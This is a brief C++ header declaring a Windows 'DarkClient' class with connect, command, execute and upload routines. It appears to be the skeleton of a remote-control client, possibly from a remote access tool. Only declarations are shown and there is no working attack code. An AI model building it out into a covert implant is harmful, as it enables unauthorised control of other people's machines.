#include <Client.h>
#include <Windows.h>

class DarkClient {
private:
	Client* _client;
public:
	DarkClient();
	int Connect(char* address, int port);
	void ConnectEventHandler(Client* client);
	void UploadConnectEventHandler(Client* client);
private:
	static void Command(Client* owner, char* cmd);
	static void Execute(Client* client);
	static void Upload(Client* client);
	static DWORD CommandRoutine(RoutineParams* commandRoutineParams);
	static DWORD UploadRoutine(RoutineParams* commandRoutineParams);
};